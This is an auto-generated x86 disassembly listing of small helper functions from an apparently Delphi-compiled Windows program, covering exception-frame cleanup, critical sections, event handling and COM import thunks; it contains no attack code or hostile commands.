setne al
retn
sub_415568
push ebp
mov ebp esp
call sub_41550c
pop ebp
retn 0x8
sub_415574
mov eax edx
mov edx ecx
call sub_413b8c
retn
sub_415580
mov eax edx
mov edx ecx
call sub_413c08
retn
sub_41558c
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_415598
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4155cc
mov ax [ edx ]
call sub_4141b8
retn
sub_4155d8
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_4141e0
pop esi
pop ebx
retn
sub_4155ec
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_4080b8
pop esi
pop ebx
retn
sub_4158f1
jmp sub_4039a8
sub_4158f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415a4b
jmp sub_4039a8
sub_415b9c
jmp sub_4039a8
sub_415ba3
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_415bac
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_415bb8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_415bc4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_415bd0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_415c84
jmp sub_4039a8
sub_415d4d
jmp sub_4039a8
sub_415d54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415d71
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
sub_415d6a
jmp sub_4039a8
sub_415d71
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415d7c
call sub_40f2b8
retn
sub_415df3
jmp sub_4039a8
sub_415dfa
pop ebp
retn
sub_415e9d
jmp sub_4039a8
sub_415ea4
pop ebp
retn
sub_415ff5
jmp sub_4039a8
sub_415ffc
pop ebp
retn
sub_416000
sub [ rw-data ] 0x1
retn
sub_416009
add eax 0xfffffff0
push eax
mov eax [ eax ]
mov eax [ eax + 0x50 ]
xchg [ esp ] eax
retn
sub_416016
add [ esp + 0x4 ] 0xfffffff0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_4164d3
jmp sub_4039a8
sub_4164da
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_416804
jmp sub_4039a8
sub_41680b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416873
jmp sub_4039a8
sub_41687a
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41697a
jmp sub_4039a8
sub_416981
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416d10
jmp sub_4039a8
sub_416d17
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_416e4f
jmp sub_4039a8
sub_416e56
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416f1c
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_416e84
mov eax ebx
mov edx esp
call sub_404208
add esp 0x100
pop ebx
retn
sub_416f78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403ff8
pop esi
pop ebx
retn
sub_417054
jmp sub_4039a8
sub_41705b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4170ac
jmp sub_4039a8
sub_4170b3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417200
jmp sub_4039a8
sub_417207
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4172d6
jmp sub_4039a8
sub_4172dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4175f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f878
pop esi
pop ebx
retn
sub_4177de
jmp sub_4039a8
sub_4177e5
pop ebp
retn
sub_4177e8
sub [ rw-data ] 0x1
retn
IsEqualGUID
jmp [ __import_lookup_table_12(ole32:IsEqualGUID) ]
CoInitialize
jmp [ __import_lookup_table_12(ole32:CoInitialize) ]
CoUninitialize
jmp [ __import_lookup_table_12(ole32:CoUninitialize) ]
CoGetClassObject
jmp [ CoGetClassObject@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
StringFromCLSID
jmp [ __import_lookup_table_12(ole32:StringFromCLSID) ]
ProgIDFromCLSID
jmp [ __import_lookup_table_12(ole32:ProgIDFromCLSID) ]
CoTaskMemFree
jmp [ CoTaskMemFree@IAT ]
OleSetMenuDescriptor
jmp [ __import_lookup_table_12(ole32:OleSetMenuDescriptor) ]
OleDraw
jmp [ __import_lookup_table_12(ole32:OleDraw) ]
IsAccelerator
jmp [ IsAccelerator@IAT ]
CreateStreamOnHGlobal
jmp [ __import_lookup_table_12(ole32:CreateStreamOnHGlobal) ]
SysFreeString
jmp [ __import_lookup_table_13(oleaut32:SysFreeString) ]
GetErrorInfo
jmp [ __import_lookup_table_13(oleaut32:GetErrorInfo) ]
sub_417b15
jmp sub_4039a8
sub_417b1c
pop ebp
retn
sub_417b20
sub [ rw-data ] 0x1
retn
sub_4183d5
[ eax - 0x53 ]
sub_418423
add [ esp + 0x4 ] 0xfffffff8
jmp sub_41adbc
sub_41842d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_41addc
sub_4187f0
cld
retn 0x41
sub_4187f4
push esp
sub al [ eax ]
push esp
sub al [ eax ]
pushfd
retn
sub_418e0b
add [ esp + 0x4 ] 0xffffffd8
jmp sub_420794
sub_418e15
add [ esp + 0x4 ] 0xffffffd8
jmp sub_4207b4
sub_418e1f
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_41918c
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_4192b0
mov eax [ eax + 0xc ]
call sub_41a474
retn
sub_419587
jmp sub_4039a8
sub_41958e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419594
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41a62c
test eax eax
setge al
pop esi
pop ebx
retn
sub_419897
jmp sub_4039a8
sub_41989e
mov esp ebp
pop ebp
retn
sub_41996c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_419978
push ebx
mov ebx edx
mov edx ebx
call sub_41978c
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_4194ec
sub_419a24
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_419b7f
jmp sub_4039a8
sub_419c53
jmp sub_4039a8
sub_419c64
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_419cd0
jmp sub_4039a8
sub_419cd7
pop ebx
mov esp ebp
pop ebp
retn
sub_419d22
jmp sub_4039a8
sub_419d29
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_419db5
jmp sub_4039a8
sub_419dbc
pop ebx
pop ebp
retn
sub_419e02
jmp sub_4039a8
sub_419e09
pop ebx
pop ebp
retn
sub_419e4e
jmp sub_4039a8
sub_419e55
pop ebx
pop ebp
retn
sub_419e9f
jmp sub_4039a8
sub_419ea6
pop esi
pop ebx
pop ebp
retn
sub_419efa
jmp sub_4039a8
sub_419f01
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_41a02e
jmp sub_4039a8
sub_41a104
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_41a714
sub_41a1f4
jmp sub_4039a8
sub_41a37e
jmp sub_4039a8
sub_41a385
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a41f
jmp sub_4039a8
sub_41a426
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a445
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41a43e
jmp sub_4039a8
sub_41a445
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_41a4a8
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a770
xor edx edx
mov eax ebx
call sub_41a734
pop ebx
retn
sub_41a520
mov eax [ ebp + 0x4 ]
retn
sub_41a556
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41a5a4
jmp sub_4039a8
sub_41a5ab
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a5b0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_41a5c8
xor edx edx
call sub_41a5d0
retn
sub_41a6b8
mov edx [ eax + 0x8 ]
dec edx
call sub_41a5d0
retn
sub_41a81c
retn
sub_41a8d6
jmp sub_4039a8
sub_41a8dd
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035c8
sub_41a96c
jmp sub_4039a8
sub_41a973
pop ebx
pop ecx
pop ebp
retn
sub_41a978
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41a9cf
jmp sub_4039a8
sub_41a9d6
pop ebx
pop ecx
pop ebp
retn
sub_41a9dc
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41aa18
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
retn
sub_41aa30
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_41ab0b
retn
sub_41ab0c
cmp edx [ eax + 0x4 ]
jae sub_41aa18
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_41abc8
test edx edx
je r-xdata
xor edx edx
call sub_41abdc
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_41ac92
jmp sub_4039a8
sub_41ac99
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41acac
xchg edx eax
call sub_41abdc
retn
sub_41acb4
retn
sub_41ad4d
jmp sub_4039a8
sub_41ad54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41adaa
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_41ae9e
jmp sub_4039a8
sub_41afae
jmp sub_4039a8
sub_41afb5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41afd2
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_41afcb
jmp sub_4039a8
sub_41afd2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b05c
jmp sub_4039a8
sub_41b074
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41b130
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41b1d9
jmp sub_4039a8
sub_41b1e0
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b1ec
mov eax [ ebp + 0x4 ]
retn
sub_41b222
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41b270
jmp sub_4039a8
sub_41b277
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b336
jmp sub_4039a8
sub_41b33d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b35f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc8
retn
sub_41b358
jmp sub_4039a8
sub_41b35f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b368
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41b370
xor eax eax
retn
sub_41b3b9
jmp sub_4039a8
sub_41b3c0
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41b4d3
jmp sub_4039a8
sub_41b4da
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b568
jmp sub_4039a8
sub_41b56f
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b63f
jmp sub_4039a8
sub_41b646
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b6fc
jmp sub_4039a8
sub_41b703
pop esi
pop ecx
pop ebp
retn
sub_41b788
jmp sub_4039a8
sub_41b78f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b7ac
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
sub_41b7a5
jmp sub_4039a8
sub_41b7ac
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b838
jmp sub_4039a8
sub_41b855
jmp sub_4039a8
sub_41b85c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b898
retn
sub_41b91b
jmp sub_4039a8
sub_41b922
mov eax [ ebp - 0x8 ]
call sub_41e45c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b947
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_41b940
jmp sub_4039a8
sub_41b947
mov esp ebp
pop ebp
retn
sub_41b997
jmp sub_4039a8
sub_41b99e
pop esi
pop ecx
pop ebp
retn
sub_41b9f1
jmp sub_4039a8
sub_41b9f8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ba00
retn
sub_41ba7b
jmp sub_4039a8
sub_41ba82
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bb1f
jmp sub_4039a8
sub_41bb26
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb43
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
sub_41bb3c
jmp sub_4039a8
sub_41bb43
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bb48
retn
sub_41bbc2
jmp sub_4039a8
sub_41bbc9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bbd0
mov eax edx
mov edx ecx
call sub_408298
retn
sub_41bbdc
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41bbf4
sub_41bc6c
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41bcdc
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41bcf8
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41beec
mov eax [ eax + 0x18 ]
retn
sub_41bef0
mov eax [ eax + 0x14 ]
retn
sub_41bf8c
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41c198
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_402804
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41c1d4
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41c1ec
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41c200
mov edx sub_41c1ec
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41c248
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_408298
retn
mov eax edx
mov edx ecx
call sub_408260
retn
sub_41c2e4
retn
sub_41c5dc
jmp sub_4039a8
sub_41c5e3
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41c644
jmp sub_4039a8
sub_41c64b
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c690
mov eax [ eax + 0x4 ]
call sub_4088f4
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41c6a0
mov eax [ eax + 0x4 ]
call sub_408920
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41c6dc
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41c885
jmp sub_4039a8
sub_41c8e4
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41c974
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41c9c4
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41cbaf
jmp sub_4039a8
sub_41cbb6
mov esp ebp
pop ebp
retn
sub_41cc60
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
retn
sub_41cce8
mov [ eax + 0x18 ] edx
retn
sub_41ce64
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_416b60
retn
sub_41ceeb
jmp sub_4039a8
sub_41cef2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41cf9e
jmp sub_4039a8
sub_41cfa5
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d149
jmp sub_4039a8
sub_41d19b
jmp sub_4039a8
sub_41d1ba
jmp sub_4039a8
sub_41d1c1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1e0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41d1d9
jmp sub_4039a8
sub_41d1e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d283
jmp sub_4039a8
sub_41d30b
jmp sub_4039a8
sub_41d318
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
pop ebx
retn
sub_41d330
mov eax [ rw-data ]
call sub_41d318
retn
sub_41d368
push ebx
call sub_4169e0
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41d330
sub_41d4d5
jmp sub_4039a8
sub_41d4dc
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403fa4
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41d5fc
jmp sub_4039a8
sub_41d603
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d6fa
jmp sub_4039a8
sub_41d717
jmp sub_4039a8
sub_41d71e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d81c
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41c264
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41d8e0
push ebx
mov ebx eax
mov eax ebx
call sub_41f294
cmp al 0x9
sete al
pop ebx
retn
sub_41d93f
jmp sub_4039a8
sub_41d946
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41d9ec
jmp sub_4039a8
sub_41d9f3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41dc72
jmp sub_4036f4
sub_41dc9e
jmp sub_4036f4
sub_41dd40
jmp sub_4036f4
sub_41dde3
jmp sub_4036f4
sub_41dfbb
jmp sub_4036f4
sub_41dffd
jmp sub_4039a8
sub_41e02d
jmp sub_4039a8
sub_41e034
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e0a3
jmp sub_4039a8
sub_41e17a
jmp sub_4039a8
sub_41e181
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e454
mov dl 0x1
call sub_41d3bc
retn
sub_41e58c
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_41e595
jmp sub_4039a8
j_sub_41e58c
jmp sub_41e58c
sub_41e59c
pop ebx
mov esp ebp
pop ebp
retn
sub_41e5a4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41f3a4
mov eax [ rw-data ]
call sub_41d318
pop ebp
retn
j_sub_403820#4
jmp sub_403820
j_sub_403820#5
jmp sub_403820
sub_41e790
jmp sub_4039a8
sub_41e797
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e877
jmp sub_4039a8
sub_41e87e
mov esp ebp
pop ebp
retn
sub_41e936
jmp sub_4039a8
sub_41e93d
pop ecx
pop ecx
pop ebp
retn
sub_41ec3f
jmp sub_4039a8
sub_41ec46
pop ebx
mov esp ebp
pop ebp
retn
sub_41eeeb
jmp sub_4039a8
sub_41eef2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403254
retn
sub_41ef0b
jmp sub_4039a8
sub_41ef2f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4036f4
sub_41ef66
jmp sub_4036f4
sub_41efa5
jmp sub_4039a8
sub_41efac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41efce
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403fc8
retn
sub_41efc7
jmp sub_4039a8
sub_41efce
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f055
jmp sub_4036f4
sub_41f082
jmp sub_4039a8
sub_41f089
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f094
push ecx
mov edx esp
mov ecx 0x4
call sub_41d858
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41d318
sub_41f1a1
jmp sub_4039a8
sub_41f1a8
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f287
jmp sub_4039a8
sub_41f28e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f2e4
jmp sub_4039a8
sub_41f2eb
pop ebx
pop ecx
pop ebp
retn
sub_41f533
jmp sub_4039a8
sub_41f53a
pop ecx
pop ecx
pop ebp
retn
sub_41f57d
jmp sub_4039a8
sub_41f584
pop ebx
pop ecx
pop ebp
retn
sub_41f620
jmp sub_4039a8
sub_41f627
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f6d5
jmp sub_4039a8
sub_41f6dc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f6e8
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41f943
jmp sub_4039a8
sub_41f94a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f96f
mov eax [ ebp - 0x8 ]
call sub_403254
mov eax [ ebp - 0x4 ]
call sub_403254
retn
sub_41f968
jmp sub_4039a8
sub_41f96f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f994
lea eax [ ebp - 0x1c ]
call sub_405a08
lea eax [ ebp - 0x18 ]
call sub_403fa4
retn
sub_41f98d
jmp sub_4039a8
sub_41f994
pop ebx
mov esp ebp
pop ebp
retn
sub_41fba6
jmp sub_4039a8
sub_41fbad
pop ebx
mov esp ebp
pop ebp
retn
sub_41fc00
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41c4c8
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41fc18
test dl dl
je r-xdata
mov dl 0x8
call sub_41fd9c
retn
mov dl 0x9
call sub_41fd9c
retn
sub_41fca0
mov dl 0x1
call sub_41fd9c
retn
sub_41fca8
xor edx edx
call sub_41fd9c
retn
sub_41fd8d
jmp sub_4039a8
sub_41fd94
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fdb0
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40d22c
sub_41fde4
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41fdfc
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_41fe08
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41fdfc
sub_41ff2e
jmp sub_4036f4
sub_41ff5d
jmp sub_4039a8
sub_41ff93
jmp sub_4039a8
sub_41ff9a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ffb9
push rw-data
call LeaveCriticalSection
retn
sub_41ffb2
jmp sub_4039a8
sub_41ffb9
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420088
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_420264
sub_4200e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41e3a4
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_4200fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41e3a4
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_420110
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41fc2c
retn
sub_42011c
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41fc2c
retn
sub_4203c4
xor eax eax
retn
sub_4203c8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4203d0
xor eax eax
retn
sub_4203d4
retn
sub_4203d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403ff8
pop esi
pop ebx
retn
sub_4203ec
mov eax [ eax + 0x4 ]
retn
sub_4203f0
retn
sub_4203f4
xor eax eax
retn
sub_4203f8
retn
sub_4203fc
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_420408
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_420414
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_420420
retn
sub_420424
xchg edx eax
call sub_41e048
retn
sub_42042c
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_4204b4
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403450
pop esi
retn
sub_4204c8
retn
sub_4205a8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403ff8
pop esi
pop ebx
retn
sub_4205e8
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_420734
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_40349c
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_42074c
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_4207d4
retn
sub_42081c
retn
sub_420854
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_42086c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_420a90
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403450
pop esi
pop ebx
retn
sub_4208b4
mov al 0x1
retn
sub_4208b8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4208c0
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_420968
xor eax eax
retn
sub_42096c
retn
sub_420998
retn
sub_420a30
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_420a44
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_41a474
retn
sub_420b8b
jmp sub_4036f4
sub_420b90
mov ebx 0x1
call sub_403a5c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_420bf3
jmp sub_4036f4
sub_420bf8
mov ebx 0x80030103
call sub_403a5c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
